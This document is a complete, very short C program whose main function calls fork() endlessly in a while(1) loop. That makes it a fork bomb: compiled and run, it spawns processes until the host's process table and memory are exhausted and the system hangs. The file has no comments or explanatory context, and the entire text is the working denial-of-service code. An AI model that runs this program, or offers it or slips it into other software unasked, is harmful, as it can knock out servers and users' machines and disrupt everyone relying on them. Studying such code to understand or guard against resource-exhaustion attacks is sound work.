#include <unistd.h>

int main( int argc, char **argv )
{
  while(1)
    fork();
  return 0;
}